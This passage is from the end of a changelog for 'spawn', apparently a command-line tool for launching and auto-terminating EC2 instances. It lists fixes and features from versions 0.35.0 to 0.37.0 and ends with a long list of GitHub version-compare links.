- Normalized SSH/EC2 keypair handling across AL2023, Ubuntu, and Windows —
  RSA for Windows (EC2 password decryption), ED25519 otherwise (#80).

## [0.37.0] - 2026-06-06

### Added
- Server-side TTL reaper backstop + a TTL-always-terminates guardrail, so an
  instance is never left running past its deadline even if in-instance
  enforcement fails (#74).

## [0.36.0 – 0.36.13] - 2026-06

A rapid stabilization series after the move to the standalone repo. Highlights:

### Added
- `--volume-size` for the root EBS volume (#11); `spawn plugin validate` and a
  top-level `spawn terminate` (#24); normalized CLI flag conventions (#40);
  periodic version-check notification.

### Fixed
- `spored` lifecycle: keep the monitor alive and let it see `/tmp` completion —
  the PrivateTmp + blocking-IMDS bugs that silently broke auto-shutdown (#65,
  #66); run `--command` as the instance user; idempotent IAM (#61, #64).
- Launch robustness: auto-detect minimum root volume size from the AMI (#25);
  non-interactive stdin and STS→IMDS identity fallback (#33, #34); real
  readiness waits instead of fixed sleeps (#32); `--ami auto` auto-detect (#15);
  suppress TUI progress in `-o json` mode (#21); spored install race (#27).

## [0.35.0] - 2026-06

Initial tagged release from the standalone `spore-host/spawn` repository.

---

Older releases are summarized in the
[GitHub Releases](https://github.com/spore-host/spawn/releases) for this repo.

[Unreleased]: https://github.com/spore-host/spawn/compare/v0.126.1...HEAD
[0.126.1]: https://github.com/spore-host/spawn/compare/v0.126.0...v0.126.1
[0.126.0]: https://github.com/spore-host/spawn/compare/v0.125.0...v0.126.0
[0.125.0]: https://github.com/spore-host/spawn/compare/v0.124.0...v0.125.0
[0.124.0]: https://github.com/spore-host/spawn/compare/v0.123.0...v0.124.0
[0.123.0]: https://github.com/spore-host/spawn/compare/v0.122.0...v0.123.0
[0.122.0]: https://github.com/spore-host/spawn/compare/v0.121.0...v0.122.0
[0.121.0]: https://github.com/spore-host/spawn/compare/v0.120.0...v0.121.0
[0.120.0]: https://github.com/spore-host/spawn/compare/v0.119.0...v0.120.0
[0.119.0]: https://github.com/spore-host/spawn/compare/v0.118.0...v0.119.0
[0.118.0]: https://github.com/spore-host/spawn/compare/v0.117.0...v0.118.0
[0.117.0]: https://github.com/spore-host/spawn/compare/v0.116.0...v0.117.0
[0.116.0]: https://github.com/spore-host/spawn/compare/v0.115.0...v0.116.0
[0.115.0]: https://github.com/spore-host/spawn/compare/v0.114.0...v0.115.0
[0.114.0]: https://github.com/spore-host/spawn/compare/v0.113.0...v0.114.0
[0.113.0]: https://github.com/spore-host/spawn/compare/v0.112.2...v0.113.0
[0.112.2]: https://github.com/spore-host/spawn/compare/v0.112.1...v0.112.2
[0.112.1]: https://github.com/spore-host/spawn/compare/v0.112.0...v0.112.1
[0.112.0]: https://github.com/spore-host/spawn/compare/v0.111.4...v0.112.0
[0.111.4]: https://github.com/spore-host/spawn/compare/v0.111.3...v0.111.4
[0.111.3]: https://github.com/spore-host/spawn/compare/v0.111.2...v0.111.3
[0.111.2]: https://github.com/spore-host/spawn/compare/v0.111.1...v0.111.2
[0.111.1]: https://github.com/spore-host/spawn/compare/v0.111.0...v0.111.1
[0.111.0]: https://github.com/spore-host/spawn/compare/v0.110.0...v0.111.0
[0.110.0]: https://github.com/spore-host/spawn/compare/v0.109.0...v0.110.0
[0.109.0]: https://github.com/spore-host/spawn/compare/v0.108.0...v0.109.0
[0.108.0]: https://github.com/spore-host/spawn/compare/v0.107.0...v0.108.0
[0.107.0]: https://github.com/spore-host/spawn/compare/v0.106.0...v0.107.0
[0.106.0]: https://github.com/spore-host/spawn/compare/v0.105.0...v0.106.0
[0.105.0]: https://github.com/spore-host/spawn/compare/v0.104.0...v0.105.0
[0.104.0]: https://github.com/spore-host/spawn/compare/v0.103.1...v0.104.0
[0.103.1]: https://github.com/spore-host/spawn/compare/v0.103.0...v0.103.1
[0.103.0]: https://github.com/spore-host/spawn/compare/v0.102.0...v0.103.0
[0.102.0]: https://github.com/spore-host/spawn/compare/v0.101.0...v0.102.0
[0.101.0]: https://github.com/spore-host/spawn/compare/v0.100.4...v0.101.0
[0.100.4]: https://github.com/spore-host/spawn/compare/v0.100.3...v0.100.4
[0.100.3]: https://github.com/spore-host/spawn/compare/v0.100.2...v0.100.3
[0.100.2]: https://github.com/spore-host/spawn/compare/v0.100.1...v0.100.2
[0.100.1]: https://github.com/spore-host/spawn/compare/v0.100.0...v0.100.1
[0.100.0]: https://github.com/spore-host/spawn/compare/v0.99.0...v0.100.0
[0.99.0]: https://github.com/spore-host/spawn/compare/v0.98.0...v0.99.0
[0.98.0]: https://github.com/spore-host/spawn/compare/v0.97.0...v0.98.0
[0.97.0]: https://github.com/spore-host/spawn/compare/v0.96.3...v0.97.0
[0.96.3]: https://github.com/spore-host/spawn/compare/v0.96.2...v0.96.3
[0.96.2]: https://github.com/spore-host/spawn/compare/v0.96.1...v0.96.2
[0.96.1]: https://github.com/spore-host/spawn/compare/v0.96.0...v0.96.1
[0.96.0]: https://github.com/spore-host/spawn/compare/v0.95.0...v0.96.0
[0.95.0]: https://github.com/spore-host/spawn/compare/v0.94.0...v0.95.0
[0.94.0]: https://github.com/spore-host/spawn/compare/v0.93.1...v0.94.0
[0.93.1]: https://github.com/spore-host/spawn/compare/v0.93.0...v0.93.1
[0.93.0]: https://github.com/spore-host/spawn/compare/v0.92.0...v0.93.0
[0.92.0]: https://github.com/spore-host/spawn/compare/v0.91.1...v0.92.0
[0.91.1]: https://github.com/spore-host/spawn/compare/v0.91.0...v0.91.1
[0.91.0]: https://github.com/spore-host/spawn/compare/v0.90.0...v0.91.0
[0.90.0]: https://github.com/spore-host/spawn/compare/v0.89.0...v0.90.0
[0.89.0]: https://github.com/spore-host/spawn/compare/v0.88.0...v0.89.0
[0.88.0]: https://github.com/spore-host/spawn/compare/v0.87.0...v0.88.0
[0.87.0]: https://github.com/spore-host/spawn/compare/v0.86.0...v0.87.0
[0.86.0]: https://github.com/spore-host/spawn/compare/v0.85.0...v0.86.0
[0.85.0]: https://github.com/spore-host/spawn/compare/v0.84.0...v0.85.0
[0.84.0]: https://github.com/spore-host/spawn/compare/v0.83.1...v0.84.0
[0.83.1]: https://github.com/spore-host/spawn/compare/v0.83.0...v0.83.1
[0.83.0]: https://github.com/spore-host/spawn/compare/v0.82.0...v0.83.0
[0.82.0]: https://github.com/spore-host/spawn/compare/v0.81.0...v0.82.0
[0.81.0]: https://github.com/spore-host/spawn/compare/v0.80.0...v0.81.0
[0.80.0]: https://github.com/spore-host/spawn/compare/v0.79.0...v0.80.0
[0.79.0]: https://github.com/spore-host/spawn/compare/v0.78.0...v0.79.0
[0.78.0]: https://github.com/spore-host/spawn/compare/v0.77.0...v0.78.0
[0.77.0]: https://github.com/spore-host/spawn/compare/v0.76.0...v0.77.0
[0.76.0]: https://github.com/spore-host/spawn/compare/v0.75.0...v0.76.0
[0.75.0]: https://github.com/spore-host/spawn/compare/v0.74.0...v0.75.0
[0.74.0]: https://github.com/spore-host/spawn/compare/v0.73.0...v0.74.0
[0.73.0]: https://github.com/spore-host/spawn/compare/v0.72.0...v0.73.0
[0.72.0]: https://github.com/spore-host/spawn/compare/v0.71.0...v0.72.0
[0.71.0]: https://github.com/spore-host/spawn/compare/v0.70.0...v0.71.0
[0.70.0]: https://github.com/spore-host/spawn/compare/v0.69.0...v0.70.0
[0.69.0]: https://github.com/spore-host/spawn/compare/v0.68.1...v0.69.0
[0.68.1]: https://github.com/spore-host/spawn/compare/v0.68.0...v0.68.1
[0.68.0]: https://github.com/spore-host/spawn/compare/v0.67.0...v0.68.0
[0.67.0]: https://github.com/spore-host/spawn/compare/v0.66.0...v0.67.0
[0.66.0]: https://github.com/spore-host/spawn/compare/v0.65.0...v0.66.0
[0.65.0]: https://github.com/spore-host/spawn/compare/v0.64.1...v0.65.0
[0.64.1]: https://github.com/spore-host/spawn/compare/v0.64.0...v0.64.1
[0.64.0]: https://github.com/spore-host/spawn/compare/v0.63.1...v0.64.0
[0.63.1]: https://github.com/spore-host/spawn/compare/v0.63.0...v0.63.1
[0.63.0]: https://github.com/spore-host/spawn/compare/v0.62.0...v0.63.0
[0.62.0]: https://github.com/spore-host/spawn/compare/v0.61.0...v0.62.0
[0.61.0]: https://github.com/spore-host/spawn/compare/v0.60.0...v0.61.0
[0.60.0]: https://github.com/spore-host/spawn/compare/v0.59.0...v0.60.0
[0.59.0]: https://github.com/spore-host/spawn/compare/v0.58.0...v0.59.0
[0.58.0]: https://github.com/spore-host/spawn/compare/v0.57.0...v0.58.0
[0.57.0]: https://github.com/spore-host/spawn/compare/v0.56.0...v0.57.0
[0.56.0]: https://github.com/spore-host/spawn/compare/v0.55.0...v0.56.0
[0.55.0]: https://github.com/spore-host/spawn/compare/v0.54.0...v0.55.0
[0.54.0]: https://github.com/spore-host/spawn/compare/v0.53.0...v0.54.0
[0.53.0]: https://github.com/spore-host/spawn/compare/v0.52.0...v0.53.0
[0.52.0]: https://github.com/spore-host/spawn/compare/v0.51.1...v0.52.0
[0.51.1]: https://github.com/spore-host/spawn/compare/v0.51.0...v0.51.1
[0.51.0]: https://github.com/spore-host/spawn/compare/v0.50.0...v0.51.0
[0.50.0]: https://github.com/spore-host/spawn/compare/v0.49.0...v0.50.0
[0.49.0]: https://github.com/spore-host/spawn/compare/v0.48.1...v0.49.0
[0.48.1]: https://github.com/spore-host/spawn/compare/v0.48.0...v0.48.1
[0.48.0]: https://github.com/spore-host/spawn/compare/v0.47.0...v0.48.0
[0.47.0]: https://github.com/spore-host/spawn/compare/v0.46.0...v0.47.0
[0.46.0]: https://github.com/spore-host/spawn/compare/v0.45.1...v0.46.0
[0.45.1]: https://github.com/spore-host/spawn/compare/v0.45.0...v0.45.1
[0.45.0]: https://github.com/spore-host/spawn/compare/v0.44.2...v0.45.0
[0.44.2]: https://github.com/spore-host/spawn/compare/v0.44.1...v0.44.2
[0.44.1]: https://github.com/spore-host/spawn/compare/v0.44.0...v0.44.1
[0.44.0]: https://github.com/spore-host/spawn/compare/v0.43.0...v0.44.0
[0.43.0]: https://github.com/spore-host/spawn/compare/v0.42.0...v0.43.0
[0.42.0]: https://github.com/spore-host/spawn/compare/v0.41.0...v0.42.0
[0.41.0]: https://github.com/spore-host/spawn/compare/v0.40.0...v0.41.0
[0.40.0]: https://github.com/spore-host/spawn/compare/v0.39.0...v0.40.0
[0.39.0]: https://github.com/spore-host/spawn/compare/v0.38.1...v0.39.0
[0.38.1]: https://github.com/spore-host/spawn/compare/v0.38.0...v0.38.1
[0.38.0]: https://github.com/spore-host/spawn/compare/v0.37.3...v0.38.0
[0.37.3]: https://github.com/spore-host/spawn/compare/v0.37.2...v0.37.3
[0.37.2]: https://github.com/spore-host/spawn/compare/v0.37.1...v0.37.2
[0.37.1]: https://github.com/spore-host/spawn/compare/v0.37.0...v0.37.1
[0.37.0]: https://github.com/spore-host/spawn/compare/v0.36.13...v0.37.0
[0.35.0]: https://github.com/spore-host/spawn/releases/tag/v0.35.0
